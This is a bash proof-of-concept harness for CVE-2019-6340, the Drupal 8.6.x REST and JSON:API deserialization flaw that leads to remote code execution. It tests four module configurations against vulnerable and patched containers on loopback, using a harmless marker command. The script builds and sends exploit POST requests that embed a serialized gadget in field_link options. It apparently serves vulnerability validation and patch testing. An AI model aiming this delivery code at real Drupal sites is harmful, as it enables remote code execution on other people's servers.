#!/usr/bin/env bash
# Ca B — CVE-2019-6340 (Drupal 8.6.x REST/web-services deserialization -> RCE).
# Reproduction matrix (loopback ONLY). Harmless marker command only:
#     echo RQ-C1-POC-MARKER > /tmp/rq-c1-poc-marker
#
# States:
#   B1  8.6.9  REST core on                       -> expect marker
#   B2  8.6.9  REST off + JSON:API (contrib 1.24) -> expect marker ("one path off" is not enough)
#   B3  8.6.9  both off                           -> expect NO marker
#   B4  8.6.10 REST core on (patched)             -> expect NO marker (allowed_classes=FALSE)
set -u
MARKER=/tmp/rq-c1-poc-marker
AUTH="admin:${WP_ADMIN_PASSWORD:-changeme}"
GADGET=/tmp/rq-gadget.raw

build_payloads() { # $1=port
  python3 - "$1" "$GADGET" <<'PY'
import json, sys
port = int(sys.argv[1]); path = sys.argv[2]
gad = open(path,'rb').read().strip().decode('utf-8')
hal = {"_links": {"type": {"href": f"http://127.0.0.1:{port}/rest/type/node/article"}},
       "title": [{"value": "rq-c1-poc-rest"}],
       "field_link": [{"uri": "http://example.com/rq-c1", "options": gad}]}
open(f"/tmp/rq-hal.{port}.json","w").write(json.dumps(hal))
japi = {"data": {"type": "node--article", "attributes": {
    "title": f"rq-c1-poc-jsonapi-{port}",
    "field_link": {"uri": "http://example.com/rq-c1", "options": gad}}}}
open(f"/tmp/rq-jsonapi.{port}.json","w").write(json.dumps(japi))
PY
}

DR() { docker exec -w /var/www/html "$1" drush "${@:2}"; }
mods() { DR "$1" pm:list --type=module --status=enabled --field=name --format=list 2>/dev/null | grep -E '^(rest|jsonapi|serialization|hal|basic_auth)$' | paste -sd, -; }
cfg_rest_resource() {
  DR "$1" php:eval '
    $c=\Drupal::configFactory()->getEditable("rest.resource.entity.node");
    $c->setData(["langcode"=>"en","status"=>true,
      "dependencies"=>["module"=>["basic_auth","hal","node"]],
      "id"=>"entity.node","plugin_id"=>"entity:node","granularity"=>"resource",
      "configuration"=>["methods"=>["GET","POST","PATCH","DELETE"],
                        "formats"=>["hal_json"],"authentication"=>["basic_auth"]]])->save();
    echo "rest.resource.entity.node configured".PHP_EOL;' 2>&1 | tail -1
}
rest_on()     { DR "$1" pm:enable rest serialization hal basic_auth -y >/dev/null 2>&1; DR "$1" pm:uninstall jsonapi -y >/dev/null 2>&1 || true; cfg_rest_resource "$1"; }
rest_off()    { DR "$1" pm:uninstall rest -y >/dev/null 2>&1 || true; }
jsonapi_on()  { DR "$1" pm:enable jsonapi serialization -y >/dev/null 2>&1; }
jsonapi_off() { DR "$1" pm:uninstall jsonapi -y >/dev/null 2>&1 || true; }

state_b1() { jsonapi_off "$1"; rest_on "$1"; }
state_b2() { rest_off "$1"; jsonapi_on "$1"; }
state_b3() { rest_off "$1"; jsonapi_off "$1"; }
state_b4() { jsonapi_off "$1"; rest_on "$1"; }

marks()  { docker exec "$1" sh -c "test -e $MARKER && echo PRESENT:\$(cat $MARKER) || echo ABSENT"; }
clear_marker() { docker exec "$1" rm -f $MARKER; }

rest_req() { # $1=port
  curl -s -o /tmp/caB.rest.$1.body -w '%{http_code}' -u "$AUTH" -X POST \
    -H 'Content-Type: application/hal+json' -H 'Accept: application/hal+json' \
    --data-binary @/tmp/rq-hal.$1.json "http://127.0.0.1:$1/node?_format=hal_json"
}
japi_req() { # $1=port
  curl -s -o /tmp/caB.japi.$1.body -w '%{http_code}' -u "$AUTH" -X POST \
    -H 'Content-Type: application/vnd.api+json' -H 'Accept: application/vnd.api+json' \
    --data-binary @/tmp/rq-jsonapi.$1.json "http://127.0.0.1:$1/jsonapi/node/article"
}

run_state() { # $1=label $2=container $3=port $4=state-fn
  local label="$1" c="$2" port="$3" fn="$4"
  echo "=================================================================="
  echo "## STATE $label  ($c :$port)"
  echo "=================================================================="
  "$fn" "$c" >/dev/null 2>&1
  DR "$c" cr >/dev/null 2>&1
  echo "-- ground truth --"
  echo "   enabled modules : $(mods "$c")"
  echo "   drupal version  : $(DR "$c" status --field=drupal-version 2>/dev/null)"
  echo "   field_link      : $(DR "$c" php:eval 'echo \Drupal\field\Entity\FieldConfig::loadByName("node","article","field_link") ? "exists" : "missing";' 2>/dev/null | tail -1)"
  clear_marker "$c"
  echo "   marker before   : $(marks "$c")"

  echo "-- REST path: POST /node?_format=hal_json (basic auth admin) --"
  local rc; rc=$(rest_req "$port")
  echo "   HTTP code       : $rc"
  echo "   response        : $(head -c 180 /tmp/caB.rest.$port.body | tr '\n' ' ')"
  echo "   marker after    : $(marks "$c")"
  if [ "$(marks "$c")" != "ABSENT" ]; then echo "   => marker created by REST path"; fi

  clear_marker "$c"
  echo "-- JSON:API path: POST /jsonapi/node/article (basic auth admin) --"
  rc=$(japi_req "$port")
  echo "   HTTP code       : $rc"
  echo "   response        : $(head -c 180 /tmp/caB.japi.$port.body | tr '\n' ' ')"
  echo "   marker after    : $(marks "$c")"
  if [ "$(marks "$c")" != "ABSENT" ]; then echo "   => marker created by JSON:API path"; fi

  echo "-- marker metadata (if present) --"
  docker exec "$c" sh -c "ls -l $MARKER 2>/dev/null || echo '   (no marker file)'"
  clear_marker "$c"
  echo
}

build_payloads 8083
build_payloads 8084

run_state "B1 / 8.6.9 / REST on"                 pilot-drupal-vuln  8083 state_b1
run_state "B2 / 8.6.9 / REST off + JSON:API on"  pilot-drupal-vuln  8083 state_b2
run_state "B3 / 8.6.9 / both off"                pilot-drupal-vuln  8083 state_b3
run_state "B4 / 8.6.10 / REST on (fixed)"        pilot-drupal-fixed 8084 state_b4

echo "== restore: vuln 8.6.9 + fixed 8.6.10 to state (i) REST on =="
state_b1 pilot-drupal-vuln >/dev/null 2>&1
state_b4 pilot-drupal-fixed >/dev/null 2>&1
echo "done."
